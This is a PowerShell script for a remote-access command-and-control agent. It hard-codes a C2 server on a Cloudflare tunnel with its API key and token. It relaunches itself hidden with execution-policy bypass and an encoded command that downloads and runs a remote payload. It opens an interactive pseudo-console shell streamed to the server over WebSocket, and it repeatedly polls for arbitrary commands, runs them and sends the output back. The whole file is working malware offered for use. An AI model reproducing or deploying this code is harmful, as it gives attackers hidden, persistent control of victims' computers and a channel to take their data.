# Enhanced PowerShell C2 Agent with ConPTY
# True interactive shell via Windows Pseudo Console
# Self-persisting + Background PTY via Runspace

$C2_URL = "https://amanda-became-courage-networks.trycloudflare.com"
$API_KEY = "c2a8106836aef9d2debb0ba0bf562ab7"
$TOKEN = "dd6b24af121ed7e5a500c34c4450487f"

# Check if we're the hidden instance
if ($env:_AGENT_HIDDEN -ne "1") {
    $url = "$C2_URL/payloads/ps_conpty_agent.ps1?key=$TOKEN"
    $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("`$env:_AGENT_HIDDEN='1';iex(iwr -uri '$url' -useb)"))
    Start-Process powershell -ArgumentList "-w hidden -ep bypass -enc $enc" -WindowStyle Hidden
    exit
}

$AgentId = "$env:COMPUTERNAME-$((Get-Random -Maximum 9999).ToString('D4'))"
$ServerUrl = "$C2_URL/bits"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# ConPTY API
$ConPtyCode = @"
using System;
using System.Runtime.InteropServices;

public class ConPty {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, IntPtr lpPipeAttributes, uint nSize);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern int CreatePseudoConsole(COORD size, IntPtr hInput, IntPtr hOutput, uint dwFlags, out IntPtr phPC);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern void ClosePseudoConsole(IntPtr hPC);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern void DeleteProcThreadAttributeList(IntPtr lpAttributeList);
    
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcessW(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool PeekNamedPipe(IntPtr hNamedPipe, IntPtr lpBuffer, uint nBufferSize, IntPtr lpBytesRead, out uint lpTotalBytesAvail, IntPtr lpBytesLeftThisMessage);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
    
    [StructLayout(LayoutKind.Sequential)]
    public struct COORD { public short X, Y; }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public int cb;
        public IntPtr lpReserved, lpDesktop, lpTitle;
        public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public short wShowWindow, cbReserved2;
        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFOEX {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess, hThread;
        public int dwProcessId, dwThreadId;
    }
    
    public IntPtr hPC, pipeIn, pipeOut, hProcess, hThread;
    
    public bool Create(short cols, short rows) {
        IntPtr pipePtyIn, pipePtyOut;
        if (!CreatePipe(out pipePtyIn, out pipeIn, IntPtr.Zero, 0)) return false;
        if (!CreatePipe(out pipeOut, out pipePtyOut, IntPtr.Zero, 0)) { CloseHandle(pipePtyIn); CloseHandle(pipeIn); return false; }
        
        COORD size = new COORD { X = cols, Y = rows };
        int hr = CreatePseudoConsole(size, pipePtyIn, pipePtyOut, 0, out hPC);
        CloseHandle(pipePtyIn); CloseHandle(pipePtyOut);
        if (hr != 0) { CloseHandle(pipeIn); CloseHandle(pipeOut); return false; }
        
        IntPtr attrSize = IntPtr.Zero;
        InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref attrSize);
        IntPtr attrList = Marshal.AllocHGlobal(attrSize);
        if (!InitializeProcThreadAttributeList(attrList, 1, 0, ref attrSize)) { Marshal.FreeHGlobal(attrList); ClosePseudoConsole(hPC); CloseHandle(pipeIn); CloseHandle(pipeOut); return false; }
        if (!UpdateProcThreadAttribute(attrList, 0, (IntPtr)0x00020016, hPC, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero)) { DeleteProcThreadAttributeList(attrList); Marshal.FreeHGlobal(attrList); ClosePseudoConsole(hPC); CloseHandle(pipeIn); CloseHandle(pipeOut); return false; }
        
        STARTUPINFOEX siEx = new STARTUPINFOEX();
        siEx.StartupInfo.cb = Marshal.SizeOf(typeof(STARTUPINFOEX));
        siEx.lpAttributeList = attrList;
        
        PROCESS_INFORMATION pi;
        bool result = CreateProcessW(null, "powershell.exe -NoLogo -NoProfile", IntPtr.Zero, IntPtr.Zero, false, 0x00080000, IntPtr.Zero, null, ref siEx, out pi);
        DeleteProcThreadAttributeList(attrList); Marshal.FreeHGlobal(attrList);
        if (!result) { ClosePseudoConsole(hPC); CloseHandle(pipeIn); CloseHandle(pipeOut); return false; }
        
        hProcess = pi.hProcess; hThread = pi.hThread;
        return true;
    }
    
    public byte[] Read() {
        uint available = 0;
        if (!PeekNamedPipe(pipeOut, IntPtr.Zero, 0, IntPtr.Zero, out available, IntPtr.Zero) || available == 0) return new byte[0];
        byte[] buffer = new byte[available];
        uint bytesRead = 0;
        if (ReadFile(pipeOut, buffer, available, out bytesRead, IntPtr.Zero)) {
            if (bytesRead < available) Array.Resize(ref buffer, (int)bytesRead);
            return buffer;
        }
        return new byte[0];
    }
    
    public bool Write(byte[] data) { uint written = 0; return WriteFile(pipeIn, data, (uint)data.Length, out written, IntPtr.Zero); }
    
    public void Close() {
        if (hPC != IntPtr.Zero) ClosePseudoConsole(hPC);
        if (pipeIn != IntPtr.Zero) CloseHandle(pipeIn);
        if (pipeOut != IntPtr.Zero) CloseHandle(pipeOut);
        if (hProcess != IntPtr.Zero) CloseHandle(hProcess);
        if (hThread != IntPtr.Zero) CloseHandle(hThread);
    }
}
"@

try { Add-Type -TypeDefinition $ConPtyCode } catch {}

function Run-Pty {
    param($WsUrl)
    
    # Create PTY first
    $pty = New-Object ConPty
    if (-not $pty.Create(120, 40)) { return }
    
    $ws = $null
    try {
        # Connect WebSocket
        $ws = New-Object System.Net.WebSockets.ClientWebSocket
        $ws.Options.KeepAliveInterval = [TimeSpan]::FromSeconds(30)
        
        try {
            $connectTask = $ws.ConnectAsync([Uri]$WsUrl, [System.Threading.CancellationToken]::None)
            [void]$connectTask.Wait(15000)
        } catch {
            $pty.Close()
            return
        }
        
        if ($ws.State -ne [System.Net.WebSockets.WebSocketState]::Open) { 
            $pty.Close()
            return 
        }
        
        # Send init as plain ASCII bytes - no BOM
        $initStr = '{"role":"agent"}'
        $initBytes = [System.Text.Encoding]::ASCII.GetBytes($initStr)
        $seg = New-Object System.ArraySegment[byte] -ArgumentList @(,$initBytes)
        try {
            $sendTask = $ws.SendAsync($seg, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None)
            [void]$sendTask.Wait(5000)
        } catch {
            $pty.Close()
            return
        }
        
        # Give server time to process
        Start-Sleep -Milliseconds 300
        
        $recvBuf = New-Object byte[] 8192
        
        # Main PTY loop
        while ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
            # Read from PTY -> send to WebSocket
            try {
                $out = $pty.Read()
                if ($out.Length -gt 0) {
                    $outSeg = New-Object System.ArraySegment[byte] -ArgumentList @(,$out)
                    $sendTask = $ws.SendAsync($outSeg, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None)
                    [void]$sendTask.Wait(5000)
                }
            } catch {}
            
            # Read from WebSocket -> write to PTY (with timeout)
            try {
                $cts = New-Object System.Threading.CancellationTokenSource
                $cts.CancelAfter(100)
                $recvSeg = New-Object System.ArraySegment[byte] -ArgumentList @(,$recvBuf)
                $recvTask = $ws.ReceiveAsync($recvSeg, $cts.Token)
                
                try { 
                    [void]$recvTask.Wait() 
                } catch [System.AggregateException] {
                    # Timeout is expected
                }
                
                if ($recvTask.Status -eq [System.Threading.Tasks.TaskStatus]::RanToCompletion) {
                    if ($recvTask.Result.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) {
                        break
                    }
                    if ($recvTask.Result.Count -gt 0) {
                        $str = [Text.Encoding]::UTF8.GetString($recvBuf, 0, $recvTask.Result.Count)
                        # Skip pings and parse JSON input
                        if ($str -and $str -ne "ping" -and -not $str.StartsWith('{"ping"')) {
                            if ($str.StartsWith('{"')) {
                                try { 
                                    $j = $str | ConvertFrom-Json
                                    if ($j.type -eq "input" -and $j.data) { $str = $j.data }
                                    elseif ($j.data) { $str = $j.data }
                                    else { $str = $null }
                                } catch { $str = $null }
                            }
                            if ($str) { 
                                [void]$pty.Write([Text.Encoding]::UTF8.GetBytes($str))
                            }
                        }
                    }
                }
                $cts.Dispose()
            } catch {}
            
            Start-Sleep -Milliseconds 30
        }
    } catch {} 
    finally {
        $pty.Close()
        if ($ws) { 
            try { $ws.Dispose() } catch {} 
        }
    }
}

# Main loop
while ($true) {
    try {
        $H = @{ "X-API-Key" = $API_KEY }
        
        # Check PTY request
        try {
            $r = Invoke-RestMethod -Uri "$ServerUrl/pty-status/$AgentId" -Headers $H -UseBasicParsing -TimeoutSec 5
            if ($r.pty_requested -eq $true) {
                $wsUrl = ($C2_URL -replace "^https://", "wss://" -replace "^http://", "ws://") + "/tty/$AgentId"
                Run-Pty -WsUrl $wsUrl
            }
        } catch {}
        
        # Poll commands
        try {
            $resp = Invoke-RestMethod -Uri "$ServerUrl/cmd/$AgentId`?key=$TOKEN" -Headers $H -UseBasicParsing -TimeoutSec 10
            if ($resp.command) {
                $cmd = $resp.command
                $result = ""
                if ($cmd -eq "ps") { $result = (Get-Process | Sort WS -Desc | Select -First 30 | ft Id,Name,@{N='MB';E={[math]::Round($_.WS/1MB,1)}} -Auto | Out-String) }
                elseif ($cmd -match "^cd\s+(.+)$") { Set-Location $Matches[1]; $result = "CD: $PWD" }
                else { try { $result = iex $cmd 2>&1 | Out-String } catch { $result = "Err: $_" } }
                if (-not $result) { $result = "[OK]" }
                
                Invoke-RestMethod -Uri "$ServerUrl/result/$AgentId`?key=$TOKEN" -Method Post -Body (@{result=$result}|ConvertTo-Json) -ContentType "application/json" -Headers $H -UseBasicParsing | Out-Null
            }
        } catch {}
    } catch {}
    
    Start-Sleep -Seconds (Get-Random -Min 3 -Max 6)
}
